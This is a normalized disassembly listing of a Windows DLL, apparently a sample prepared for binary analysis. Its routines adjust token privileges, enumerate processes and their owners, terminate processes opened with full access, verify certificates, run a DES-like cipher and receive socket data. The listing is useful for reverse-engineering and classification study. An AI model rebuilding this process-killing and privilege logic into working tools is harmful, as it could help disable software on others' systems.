lea eax [ ebp - 0x18 ]
push r--data
push eax
call _CxxThrowException
sub_1000470e
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x34 ] ebx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] bl
jbe r-xdata
mov eax [ esi + 0x28 ]
push edi
or edi 0xffffffff
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
cmp [ eax ] edi
je r-xdata
push [ esi + 0x3c ]
call [ free@IAT ]
pop ecx
mov eax [ esi + 0x24 ]
cmp [ eax ] edi
je r-xdata
cmp [ eax + 0x4 ] edi
je r-xdata
cmp [ esp + 0x10 ] bl
pop edi
jne r-xdata
cmp [ eax + 0x4 ] edi
je r-xdata
mov ecx [ esi + 0x2c ]
push eax
call [ ecx + 0x24 ]
mov eax [ esi + 0x28 ]
mov [ eax ] edi
mov eax [ esi + 0x28 ]
mov [ eax + 0x4 ] edi
pop esi
pop ebx
retn 0x4
push [ esi + 0x18 ]
call ??3@YAXPAX@Z
push [ esi + 0x20 ]
call operator delete
push [ esi + 0x24 ]
call operator delete
push [ esi + 0x28 ]
call operator delete
mov eax [ esi + 0x30 ]
add esp 0x10
cmp eax ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
je r-xdata
mov ecx [ esi + 0x2c ]
push eax
call [ ecx + 0x10 ]
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax + 0x4 ] edi
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] ebx
sub_100047fa
push edi
mov edi ecx
cmp [ edi + 0x28 ] 0x0
je r-xdata
pop edi
retn
push ebx
push esi
push 0x2
lea esi [ edi + 0x18 ]
pop ebx
mov eax [ edi + 0xc ]
push [ esi ]
call [ eax + 0x40 ]
and [ esi ] 0x0
add esi 0xc
dec ebx
jne r-xdata
pop esi
pop ebx
sub_10004820
push edi
mov edi ecx
cmp [ edi + 0x40 ] 0x0
je r-xdata
pop edi
retn
push ebx
push esi
push 0x4
lea esi [ edi + 0x18 ]
pop ebx
mov eax [ edi + 0xc ]
push [ esi ]
call [ eax + 0x40 ]
and [ esi ] 0x0
add esi 0xc
dec ebx
jne r-xdata
pop esi
pop ebx
sub_10004846
push ebp
mov ebp esp
push ecx
mov al [ ecx + 0x8 ]
and [ ebp - 0x4 ] 0x0
push esi
lea esi [ ecx + 0x8 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
mov ecx edi
mov [ edi ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx edi
push [ eax ]
push 0x0
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov eax edi
pop edi
pop esi
leave
retn 0x4
sub_10004883
push ebp
mov ebp esp
sub esp 0x198
cmp [ ebp + 0x8 ] 0x0
push esi
jne r-xdata
mov al 0x1
lea eax [ ebp - 0x94 ]
mov [ ebp - 0x94 ] 0x94
push eax
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x84 ] 0x2
jne r-xdata
pop esi
leave
retn
cmp [ ebp - 0x84 ] 0x1
jne r-xdata
cmp [ ebp - 0x90 ] 0x4
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x198 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x198 ]
pop ecx
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ FreeLibrary@IAT ]
call eax
mov ecx [ ebp + 0xc ]
test eax eax
mov [ ecx ] eax
jne r-xdata
sub_10004925
push ebp
mov ebp esp
sub esp 0x54
lea eax [ ebp - 0x8 ]
push ebx
push eax
mov eax [ ebp + 0xc ]
push 0x53
xor ebx ebx
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
call [ eax + 0x2c ]
test eax eax
jne r-xdata
xor al al
cmp [ ebp - 0x8 ] ebx
je r-xdata
push esi
push 0x10
pop esi
lea eax [ ebp - 0x30 ]
push esi
push ebx
push eax
call memset
mov al [ ebp + 0x8 ]
add esp 0xc
neg al
sbb eax eax
mov [ ebp - 0x30 ] esi
and eax 0x2
mov [ ebp - 0x2c ] 0x1
inc eax
cmp [ ebp + 0x8 ] bl
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x14 ] rw-data
mov [ ebp - 0x10 ] rw-data
mov [ ebp - 0xc ] rw-data
mov [ ebp + 0x10 ] rw-data
lea eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
lea eax [ ebp - 0x30 ]
push ebx
push eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x10 ]
push ebx
push eax
push ebx
call [ CertGetCertificateChain@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x10 ]
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call memset
xor eax eax
cmp [ ebp + 0x8 ] bl
push 0xc
mov [ ebp - 0x40 ] esi
setne al
inc eax
pop esi
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x34 ] eax
push esi
lea eax [ ebp - 0x20 ]
push ebx
push eax
call memset
push 0x14
mov [ ebp - 0x20 ] esi
lea eax [ ebp - 0x40 ]
pop esi
mov [ ebp - 0x18 ] eax
push esi
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0x24
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x54 ] esi
push eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x4 ]
push 0x4
call [ CertVerifyCertificateChainPolicy@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov esi [ ebp + 0x1c ]
mov [ ebp + 0xb ] 0x1
cmp esi ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x4 ]
call [ CertFreeCertificateChain@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x4 ]
call [ CertFreeCertificateChain@IAT ]
mov [ ebp - 0x4 ] ebx
mov al [ ebp + 0xb ]
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CertFreeCertificateChain@IAT ]
mov eax [ ebp - 0x8 ]
push edi
push [ eax + 0x8 ]
call ??2@YAPAXI@Z
mov edi eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push edi
call memcpy
mov eax [ ebp - 0x50 ]
add esp 0x10
mov [ esi ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0xb ] bl
mov eax [ eax ]
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] eax
pop edi
pop ebx
leave
retn
sub_10004ac1
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
jne r-xdata
push 0x0
push 0x0
push ebx
call [ fseek@IAT ]
mov esi [ fread@IAT ]
add esp 0xc
call [ GetLastError@IAT ]
and [ ebp - 0x28 ] bl
push 0x7
mov edx eax
pop ecx
xor eax eax
lea edi [ ebp - 0x27 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push edx
push rw-data
lea eax [ ebp - 0x28 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x28 ]
push eax
call [ OutputDebugStringA@IAT ]
jmp r-xdata
test [ ebx + 0xc ] 0x10
jne r-xdata
cmp [ ebp + 0x9 ] 0x34
jne r-xdata
xor eax eax
push ebx
call [ fclose@IAT ]
pop ecx
jmp r-xdata
cmp [ ebp + 0xa ] 0x5e
jne r-xdata
push ebx
push 0x4
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
call esi
add esp 0x10
cmp [ ebp + 0x8 ] 0x1b
jne r-xdata
cmp [ ebp + 0xb ] 0x2d
je r-xdata
push ebx
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
push ebx
push edi
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call esi
push ebx
push edi
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call esi
add esp 0x30
call [ GetLastError@IAT ]
and [ ebp - 0x28 ] 0x0
push 0x7
mov edx eax
pop ecx
xor eax eax
lea edi [ ebp - 0x27 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push edx
push rw-data
lea eax [ ebp - 0x28 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x28 ]
push eax
call [ OutputDebugStringA@IAT ]
push ebx
call [ fclose@IAT ]
pop ecx
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_10004be3
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
lea edi [ eax + 0x7 ]
and edi 0xfffffff8
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_10004cab
cmp [ esi + 0x600 ] 0x0
jne r-xdata
sar edi 0x3
mov eax edi
test eax eax
jle r-xdata
sar edi 0x3
test edi edi
jle r-xdata
mov al 0x1
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
lea edi [ esi + 0x300 ]
mov [ ebp + 0x14 ] eax
sete [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ecx esi
push esi
push [ ebp + 0xc ]
push ebx
call sub_10004d16
add [ ebp + 0xc ] 0x8
add ebx 0x8
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
push [ ebp + 0x1c ]
mov ecx esi
push esi
push [ ebp + 0xc ]
push ebx
call sub_10004d16
push [ ebp + 0x8 ]
mov ecx esi
push edi
push ebx
push ebx
call sub_10004d16
push [ ebp + 0x1c ]
mov ecx esi
push esi
push ebx
push ebx
call sub_10004d16
add [ ebp + 0xc ] 0x8
add ebx 0x8
dec [ ebp + 0x14 ]
jne r-xdata
jmp r-xdata
sub_10004cab
push esi
mov esi ecx
push edi
push 0x10
lea edi [ esi + 0x701 ]
push 0x0
push edi
call memset
add esp 0xc
cmp [ esp + 0x10 ] 0x10
jle r-xdata
mov eax [ esp + 0x10 ]
push 0x10
pop eax
jmp r-xdata
xor al al
lea eax [ esi + 0x709 ]
mov ecx esi
push eax
lea eax [ esi + 0x300 ]
push eax
call sub_10004e30
mov al 0x1
jmp r-xdata
push eax
push [ esp + 0x10 ]
push edi
call memcpy
add esp 0xc
mov ecx esi
push edi
push esi
call sub_10004e30
cmp [ esp + 0x10 ] 0x8
jle r-xdata
mov [ esi + 0x600 ] al
pop edi
pop esi
retn 0x8
sub_10004d16
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x40
push [ ebp + 0xc ]
mov edi rw-data
mov ebx ecx
push edi
call sub_10004fff
push 0x40
push r--data
push edi
push edi
mov ecx ebx
call sub_10004f5e
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x10 ]
jne r-xdata
add eax 0x2d0
mov [ ebp + 0x10 ] 0x10
mov [ ebp + 0x14 ] eax
mov esi rw-data
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x10 ] 0x10
mov esi rw-data
push 0x20
push [ rw-data ]
push esi
call memcpy
add esp 0xc
mov ecx ebx
push [ ebp + 0x14 ]
push [ rw-data ]
call sub_10004eb6
push 0x20
mov ecx ebx
push [ rw-data ]
push [ rw-data ]
call sub_10004f9e
push 0x20
push esi
push [ rw-data ]
call memcpy
sub [ ebp + 0x14 ] 0x30
add esp 0xc
dec [ ebp + 0x10 ]
jne r-xdata
push 0x40
push r--data
push edi
push edi
mov ecx ebx
call sub_10004f5e
push 0x40
push edi
push [ ebp + 0x8 ]
mov ecx ebx
call sub_10005030
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
push 0x20
push [ rw-data ]
push esi
call memcpy
add esp 0xc
mov ecx ebx
push [ ebp + 0x14 ]
push [ rw-data ]
call sub_10004eb6
push 0x20
mov ecx ebx
push [ rw-data ]
push [ rw-data ]
call sub_10004f9e
push 0x20
push esi
push [ rw-data ]
call memcpy
add [ ebp + 0x14 ] 0x30
add esp 0xc
dec [ ebp + 0x10 ]
jne r-xdata
jmp r-xdata
sub_10004e30
push ebx
push ebp
push esi
push edi
push 0x40
mov edi rw-data
push [ esp + 0x1c ]
mov ebx ecx
push edi
call sub_10004fff
push 0x38
push r--data
push edi
push edi
mov ecx ebx
call sub_10004f5e
mov eax [ esp + 0x14 ]
xor ebp ebp
mov [ esp + 0x18 ] eax
movsx eax [ ebp + r--data ]
lea esi [ ebp + r--data ]
push eax
push 0x1c
mov ecx ebx
push [ rw-data ]
call sub_10004fbe
movsx eax [ esi ]
push eax
push 0x1c
push [ rw-data ]
mov ecx ebx
call sub_10004fbe
push 0x30
push r--data
push edi
mov ecx ebx
push [ esp + 0x24 ]
call sub_10004f5e
add [ esp + 0x18 ] 0x30
inc ebp
cmp ebp 0x10
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_10004eb6
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
push 0x30
push r--data
mov esi rw-data
push ebx
mov edi ecx
push esi
call sub_10004f5e
push 0x30
mov ecx edi
push [ esp + 0x18 ]
push esi
call sub_10004f9e
push esi
push ebx
mov ecx edi
call sub_10004eff
push 0x20
push r--data
push ebx
push ebx
mov ecx edi
call sub_10004f5e
pop edi
pop esi
pop ebx
retn 0x8
sub_10004eff
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x8
mov [ ebp - 0x4 ] ecx
xor edi edi
pop ebx
mov al [ esi + 0x1 ]
mov cl [ esi ]
shl al 0x1
add al [ esi + 0x2 ]
push 0x4
shl cl 0x1
add cl [ esi + 0x5 ]
shl al 0x1
add al [ esi + 0x3 ]
movsx ecx cl
shl al 0x1
add al [ esi + 0x4 ]
add ecx edi
shl ecx 0x4
movsx eax al
lea eax [ eax + ecx + r--data ]
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_10004fff
add [ ebp + 0x8 ] 0x4
add edi 0x4
add esi 0x6
dec ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10004f5e
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] eax
jle r-xdata
push [ ebp + 0x14 ]
add ecx 0x601
push ecx
push [ ebp + 0x8 ]
call memcpy
add esp 0xc
pop ebp
retn 0x10
push esi
mov edx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
movsx edx [ eax + edx ]
inc eax
mov dl [ edx + esi - 0x1 ]
cmp eax [ ebp + 0x14 ]
mov [ ecx + eax + 0x600 ] dl
jl r-xdata
pop esi
sub_10004f9e
push esi
mov esi [ esp + 0x10 ]
test esi esi
jle r-xdata
pop esi
retn 0xc
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
sub ecx eax
mov dl [ ecx + eax ]
xor [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_10004fbe
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x18 ]
lea ebx [ ecx + 0x601 ]
push edi
push esi
push ebx
call memcpy
mov eax [ esp + 0x20 ]
sub eax edi
push eax
lea eax [ esi + edi ]
push eax
push esi
call memcpy
sub esi edi
push edi
add esi [ esp + 0x30 ]
push ebx
push esi
call memcpy
add esp 0x24
pop edi
pop esi
pop ebx
retn 0xc
sub_10004fff
xor eax eax
cmp [ esp + 0xc ] eax
jle r-xdata
retn 0xc
push esi
mov esi [ esp + 0xc ]
mov edx eax
sar edx 0x3
mov cl al
mov dl [ edx + esi ]
and cl 0x7
sar dl cl
mov ecx [ esp + 0x8 ]
and dl 0x1
mov [ eax + ecx ] dl
inc eax
cmp eax [ esp + 0x10 ]
jl r-xdata
pop esi
sub_10005030
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
sar eax 0x3
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push eax
push esi
push edi
call memset
add esp 0xc
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop edi
pop esi
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
mov ecx esi
mov eax esi
and ecx 0x7
mov dl [ esi + edx ]
sar eax 0x3
shl dl cl
add eax edi
or [ eax ] dl
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
sub_100050b2
push ebx
push ebp
push esi
mov esi ecx
push edi
mov edi 0x2000
cmp [ esi + 0x4 ] 0x0
mov ebp edi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push edi
call [ malloc@IAT ]
pop ecx
mov [ esi + 0x4 ] eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push edi
push eax
push 0x5
call [ esi ]
mov ebx 0xc0000004
add ebp edi
push ebp
push [ esi + 0x4 ]
call [ realloc@IAT ]
pop ecx
mov [ esi + 0x4 ] eax
pop ecx
push 0x0
push ebp
push eax
push 0x5
call [ esi ]
jmp r-xdata
cmp eax ebx
jne r-xdata
sub_10005108
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
mov esi ecx
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x20b ]
mov [ ebp - 0x20c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x107 ]
mov [ ebp - 0x108 ] bl
mov [ ebp - 0x1 ] bl
[ edi ]
stosw [ edi ]
mov ecx esi
stosb [ edi ]
call sub_100050b2
mov edi 0x104
push 0x208
lea eax [ ebp - 0x414 ]
push ebx
push eax
call memset
push edi
lea eax [ ebp - 0x108 ]
push ebx
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x414 ]
mov ecx esi
push eax
mov eax [ esi + 0x4 ]
push [ eax + 0x44 ]
call sub_1000530a
push ebx
push ebx
lea eax [ ebp - 0x20c ]
push edi
push eax
mov eax [ esi + 0x4 ]
push 0xffffffff
push [ eax + 0x3c ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp - 0x20c ]
push eax
mov eax [ esi + 0x4 ]
push [ eax + 0x44 ]
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x108 ]
push eax
push [ ebp + 0x8 ]
call strcat
push edi
lea eax [ ebp - 0x108 ]
push ebx
push eax
call memset
lea eax [ ebp - 0x310 ]
push eax
call strlen
add esp 0x28
test eax eax
lea eax [ ebp - 0x414 ]
push eax
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x108 ]
push eax
push [ ebp + 0x8 ]
call strcat
mov eax [ esi + 0x4 ]
pop ecx
pop ecx
mov ecx [ eax ]
add ecx eax
cmp [ ebp - 0x1 ] bl
mov [ esi + 0x4 ] ecx
je r-xdata
sub_10005286
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x4 ]
push esi
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
lea eax [ ebp - 0xc ]
xor esi esi
push eax
push [ ebp + 0x8 ]
push esi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
neg eax
sbb eax eax
push esi
and eax 0x2
push esi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
call [ AdjustTokenPrivileges@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
push 0x1
pop eax
jmp r-xdata
sub_1000530a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_100053ff
xor ebx ebx
cmp [ ebp - 0x1c ] ebx
je r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push 0x8
push eax
call [ OpenProcessToken@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x30 ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x28 ]
mov esi [ GetTokenInformation@IAT ]
call esi
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x30 ]
add eax eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov edi eax
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x24 ] edi
mov eax [ ebp - 0x30 ]
add eax eax
mov [ ebp - 0x30 ] eax
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push edi
push 0x1
push [ ebp - 0x28 ]
call esi
mov [ ebp - 0x20 ] eax
call [ GetLastError@IAT ]
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
push [ ebp - 0x28 ]
call [ CloseHandle@IAT ]
mov eax 0x104
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x104 ]
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
push [ edi ]
push ebx
call [ LookupAccountSidA@IAT ]
mov [ ebp - 0x20 ] eax
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp - 0x24 ]
call ??3@YAXPAX@Z
pop ecx
sub_100053ff
cmp [ ebp - 0x1c ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x24 ] ebx
je r-xdata
push [ ebp - 0x28 ]
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp - 0x24 ]
call ??3@YAXPAX@Z
pop ecx
sub_10005440
push ebx
push ebp
push esi
push edi
push 0x1
mov esi rw-data
pop ebx
mov ebp ecx
push ebx
push esi
call sub_10005286
push [ esp + 0x14 ]
push ebx
push 0x1f0fff
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
push edi
call [ CloseHandle@IAT ]
push 0x0
push esi
mov ecx ebp
call sub_10005286
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0x4
push 0x0
push edi
call [ TerminateProcess@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
sub_1000549f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
call sub_100050b2
xor ebx ebx
mov edi [ MultiByteToWideChar@IAT ]
push ebx
push ebx
push 0xffffffff
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push ebx
push ebx
call edi
mov [ ebp - 0x10 ] eax
add eax eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x8 ] eax
push [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push ebx
push ebx
call edi
cmp [ eax + 0x3c ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
push 0x4
push [ eax + 0x3c ]
push [ ebp - 0x8 ]
call [ _wcsnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
add ecx eax
mov [ esi + 0x4 ] ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
add ecx eax
cmp [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx esi
push [ eax + 0x44 ]
call sub_10005440
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
cmp ecx ebx
jne r-xdata
push [ ebp - 0x8 ]
call ??3@YAXPAX@Z
mov eax [ ebp - 0xc ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10001000
call sub_10001010
jmp sub_10001020
sub_10001010
mov ecx rw-data
jmp sub_10004aa9
sub_10001020
push sub_10001030
call sub_100034bc
pop ecx
retn
sub_10001030
mov ecx rw-data
jmp sub_10004ac0
sub_10001040
call sub_10001050
jmp sub_10001060
sub_10001050
mov ecx rw-data
jmp sub_10004be0
sub_10001060
push sub_10001070
call sub_100034bc
pop ecx
retn
sub_10001070
mov ecx rw-data
jmp sub_10004ac0
sub_10001080
call sub_10001090
jmp sub_100010a0
sub_10001090
mov ecx rw-data
jmp sub_10005072
sub_100010a0
push sub_100010b0
call sub_100034bc
pop ecx
retn
sub_100010b0
mov ecx rw-data
jmp sub_10005080
sub_100010c0
call sub_100010d0
jmp sub_100010e0
sub_100010d0
mov ecx rw-data
jmp sub_10005072
sub_100010e0
push sub_100010f0
call sub_100034bc
pop ecx
retn
sub_100010f0
mov ecx rw-data
jmp sub_10005080
sub_100019f0
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
retn
sub_10001a00
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x0
push eax
push ecx
push edx
call [ recv@IAT ]
retn
sub_10001bfc
mov ecx rw-data
call sub_10005090
mov eax r-xdata
retn
sub_10001c10
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
retn
sub_10001c20
mov eax [ rw-data ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] 0x47ae147b
mov [ rw-data ] 0x3f847ae1
call [ SetEvent@IAT ]
retn
sub_10002960
mov ecx rw-data
call [ std::basic_fstream<char,struct std::char_traits<char> >::~basic_fstream<char,struct std::char_traits<char> >@IAT ]
mov ecx rw-data
jmp [ std::basic_ios<char,struct std::char_traits<char> >::~basic_ios<char,struct std::char_traits<char> >@IAT ]
sub_10002980
retn
sub_10003490
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_100034bc
push [ esp + 0x4 ]
call sub_10003490
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_ftol
jmp [ _ftol@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_1000366a
push esi
mov esi ecx
and [ esi + 0x2c ] 0x0
and [ esi + 0x20 ] 0x0
call sub_100044fa
mov eax esi
pop esi
retn
sub_100036f5
mov ecx [ ebp - 0x14 ]
push 0x1
call sub_1000470e
push 0x0
push 0x0
call _CxxThrowException
sub_10003915
mov [ ecx ] r--data
push 0x1
add ecx 0x8
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
retn
sub_1000397a
push esi
mov esi ecx
call sub_10003915
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_100047c6
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
push [ esi + 0x18 ]
call [ eax + 0x40 ]
and [ esi + 0x18 ] 0x0
sub_100047de
mov eax [ esp + 0x4 ]
push esi
